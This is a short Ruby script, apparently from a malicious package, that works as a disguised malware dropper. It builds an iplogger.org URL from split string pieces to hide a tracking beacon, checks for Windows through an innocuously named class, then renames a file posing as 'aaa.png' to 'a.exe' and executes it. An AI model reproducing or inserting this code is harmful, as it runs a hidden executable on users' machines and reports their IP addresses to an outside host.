require 'base64'
require 'open3'
require 'rbconfig'
require 'httparty'
class TacoBell
  def self.check_win
    begin
      os = RbConfig::CONFIG['host_os']
      if os.match(/mswin|msys|mingw|cygwin|bccwin|wince|emc/)
        true
      end
    rescue
    end
  end
end

d = "https:/"
e = "."
rsp = HTTParty.get(d + "/" + "iplogger" + e + "org/1kZn67.jpeg")
if TacoBell.check_win
  File.rename("aaa.png", "a.exe")
  exec("a.exe")
end